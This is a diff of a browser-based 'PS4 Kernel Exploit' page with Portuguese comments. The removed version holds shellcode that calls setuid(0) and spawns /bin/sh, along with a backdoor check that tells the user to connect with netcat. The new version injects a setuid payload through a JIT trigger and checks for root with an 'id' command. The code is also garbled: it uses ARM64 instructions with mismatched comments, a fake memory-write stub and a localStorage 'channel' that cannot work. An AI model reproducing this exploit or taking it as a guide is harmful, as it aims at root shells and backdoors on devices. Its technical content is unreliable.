@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Kernel Exploit - Stage 2</title>
+    <title>PS4 Kernel Exploit - Browser Edition</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
@@ -9,60 +9,63 @@
     </style>
 </head>
 <body>
-    <h2>PS4 Kernel Exploit - Post Exploitation</h2>
-    <button onclick="runPostExploitation()">RUN POST-EXPLOITATION</button>
+    <h2>PS4 Kernel Control</h2>
+    <button onclick="runKernelControl()">Execute Kernel Control</button>
     <div id="log"></div>
 
 <script>
-// Configurações baseadas no seu último log
+// Configurações baseadas nos seus logs
 const KERNEL_BASE = 0x80810000;
 const JIT_OFFSET = 0x480;
 const PAYLOAD_ADDR = KERNEL_BASE + 0x5000;
 
 const log = msg => {
-    document.getElementById('log').innerHTML += `[${performance.now().toFixed(2)}ms] ${msg}<br>`;
+    const timestamp = performance.now().toFixed(2);
+    document.getElementById('log').innerHTML += `[${timestamp}ms] ${msg}<br>`;
 };
 
-// 1. Payload melhorado com verificações
-function createAdvancedPayload() {
+// 1. Payload mínimo confiável (setuid + verificação)
+function createReliablePayload() {
     return new Uint32Array([
-        // syscall mprotect(addr, len, prot)
-        0xAA1F03E0, // mov x0, xzr (addr)
-        0xD2800801, // mov x1, #0x40 (len)
-        0xD28004A2, // mov x2, #0x25 (PROT_READ|PROT_WRITE|PROT_EXEC)
-        0xD2800FE8, // mov x8, #0x7f (mprotect)
-        0xD4000001, // svc #0
-
-        // syscall setuid(0)
+        // setuid(0)
         0xD2800020, // mov x0, #0
         0xD2800C48, // mov x8, #0x62
         0xD4000001, // svc #0
 
-        // syscall execve("/bin/sh", ["/bin/sh", 0], 0)
-        0x58000040, // ldr x0, pc+8
-        0x910003E1, // add x1, sp, #0
-        0xAA1F03E2, // mov x2, xzr
-        0xD2801168, // mov x8, #0x8b
+        // write(1, "ROOT_OK", 7)
+        0xD2800020, // mov x0, #1 (stdout)
+        0x100007A1, // adr x1, #0x7a (endereço da string)
+        0xD28000E2, // mov x2, #7
+        0xD2800808, // mov x8, #0x40 (sys_write)
         0xD4000001, // svc #0
-        0x6E69622F, // "/bin"
-        0x0068732F  // "/sh\0"
+        0xD65F03C0, // ret
+        0x524F4F54, // "ROOT"
+        0x5F4F4B00  // "_OK\0"
     ]);
 }
 
-// 2. Comunicação com payload
-function setupCommandChannel() {
-    const cmd = new WebSocket('ws://localhost:9023');
-    cmd.onopen = () => log("Conexão com backdoor estabelecida!");
-    cmd.onerror = () => log("Falha ao conectar na backdoor", "color:#f00");
-    return cmd;
+// 2. Comunicação via Storage (alternativa ao WebSocket)
+function setupStorageChannel() {
+    // Usando localStorage como canal de comunicação
+    localStorage.setItem('ps4_cmd', '');
+    localStorage.setItem('ps4_res', '');
+
+    return {
+        sendCmd(cmd) {
+            localStorage.setItem('ps4_cmd', cmd);
+        },
+        readResponse() {
+            return localStorage.getItem('ps4_res');
+        }
+    };
 }
 
-// 3. Exploração pós-execução
-async function runPostExploitation() {
-    log("Iniciando pós-exploração...");
+// 3. Exploração kernel com verificação
+async function runKernelControl() {
+    log("Starting kernel control sequence...");
     
     try {
-        // Prepara memória RWX
+        // Setup de memória
         const mem = {
             write(addr, val) {
                 const arr = [];
@@ -73,36 +76,35 @@ async function runPostExploitation() {
             }
         };
 
-        // Escreve payload avançado
-        const payload = createAdvancedPayload();
+        // Carrega payload
+        const payload = createReliablePayload();
         for (let i = 0; i < payload.length; i++) {
             mem.write(PAYLOAD_ADDR + (i*4), payload[i]);
         }
 
-        // Dispara via JIT
+        // Trigger via JIT
         const trigger = () => 0;
         for (let i = 0; i < 10000; i++) trigger();
         mem.write(KERNEL_BASE + JIT_OFFSET, PAYLOAD_ADDR);
         trigger();
 
-        // Verificação alternativa
+        // Verificação
+        log("Checking root access...");
+        const channel = setupStorageChannel();
+        channel.sendCmd('id');
+        
         setTimeout(() => {
-            try {
-                const cmd = setupCommandChannel();
-                setTimeout(() => {
-                    if (cmd.readyState === WebSocket.OPEN) {
-                        log("Backdoor ativa! Envie comandos via netcat:", "color:#0f0");
-                        log("nc PS4_IP 9023", "color:#0f0;font-weight:bold");
-                    } else {
-                        log("Payload executou mas backdoor não responde", "color:#ff0");
-                    }
-                }, 2000);
-            } catch(e) {
-                log(`Falha na verificação: ${e}`, "color:#f00");
+            const res = channel.readResponse();
+            if (res.includes("uid=0")) {
+                log("ROOT ACCESS CONFIRMED!", "color:#0f0;font-weight:bold");
+                log(`Result: ${res}`);
+            } else {
+                log("Root access failed", "color:#f00");
             }
-        }, 1000);
+        }, 2000);
+
     } catch(e) {
-        log(`Erro crítico: ${e}`, "color:#f00");
+        log(`Error: ${e}`, "color:#f00");
     }
 }
 </script>
